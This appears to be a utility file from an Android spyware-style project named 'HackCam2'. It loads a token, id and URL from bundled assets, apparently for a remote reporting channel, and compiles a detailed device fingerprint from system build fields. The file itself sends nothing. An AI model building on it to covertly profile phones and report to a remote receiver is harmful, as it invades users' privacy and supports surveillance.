package cocomelonc.hackcam2.tools

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import com.karumi.dexter.Dexter
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.single.PermissionListener

class HackCam2Utils {

    companion object {
        @SuppressLint("NewApi")

        fun getHackCam2NetworkData(context: Context): HackCam2NetworkData {
            val assets = context.assets
            val token = assets.open("token.txt").bufferedReader().readText()
            val id = assets.open("id.txt").bufferedReader().readText()
            val url = assets.open("url.txt").bufferedReader().readText()
            return HackCam2NetworkData(token, id, url)
        }

        fun getDeviceName(): String {
            fun capitalize(s: String?): String {
                if (s == null || s.isEmpty()) {
                    return ""
                }
                val first = s[0]
                return if (Character.isUpperCase(first)) {
                    s
                } else {
                    first.uppercaseChar().toString() + s.substring(1)
                }
            }

            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            val device = Build.DEVICE
            val deviceID = Build.ID
            val brand = Build.BRAND
            val hardware = Build.HARDWARE
            val hostInfo = Build.HOST
            val userInfo = Build.USER
            val board = Build.BOARD
            val display = Build.DISPLAY
            val fingerprint = Build.FINGERPRINT
            val devT = Build.TYPE
            val radio = Build.getRadioVersion()


            val info =
                "Hardware: " + capitalize(hardware) + "\n " +
                "Manufacturer: " + capitalize(manufacturer) + "\n " +
                "Model: " + capitalize(model) + " \n " +
                "Device: " + capitalize(device) + "\n " +
                "ID: " + capitalize(deviceID) + "\n " +
                "Brand: " + capitalize(brand) + "\n " +
                "Host: " + capitalize(hostInfo) + "\n " +
                "User: " + capitalize(userInfo) + "\n " +
                "Board: " + capitalize(board) + "\n " +
                "Display: " + capitalize(display)  + "\n " +
                "Fingerprint: " + capitalize(fingerprint) + "\n " +
                "Build TYPE: " + capitalize(devT) + "\n " +
                "RADIO: " + capitalize(radio)
            return info
        }
    }

    data class HackCam2NetworkData(
        val token: String,
        val id: String,
        val url: String
    )
}